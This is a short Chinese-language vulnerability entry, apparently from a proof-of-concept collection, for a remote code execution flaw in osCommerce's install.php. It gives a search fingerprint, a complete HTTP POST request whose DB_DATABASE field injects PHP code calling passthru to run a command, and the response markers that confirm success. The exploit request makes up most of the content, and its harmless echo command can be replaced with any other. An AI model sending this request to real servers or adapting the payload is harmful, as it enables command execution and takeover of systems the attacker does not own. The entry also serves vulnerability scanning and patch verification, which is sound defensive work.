﻿#  osCommerce install.php 远程代码执行漏洞

> 更新时间：2024-05-14

> 漏洞编号：

> 漏洞说明： osCommerce install.php存在远程代码执行漏洞，恶意攻击者可能利用此漏洞执行恶意命令，获取服务器敏感信息，最终可能导致服务器失陷。  

> 漏洞特征：body="www.oscommerce.com"

> 验证脚本：HTTP

```
POST /install/install.php?step=4 HTTP/1.1
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

DIR_FS_DOCUMENT_ROOT=.%2F&DB_DATABASE=%27%29%3Bpassthru%28%27echo+Hello+World%21%27%29%3B%2F%2A
```

> 响应代码特征：200

> 响应内容特征：Hello

> 上传文件定位：

> 验证文件来源：osCommerce install.php 远程代码执行漏洞.poc

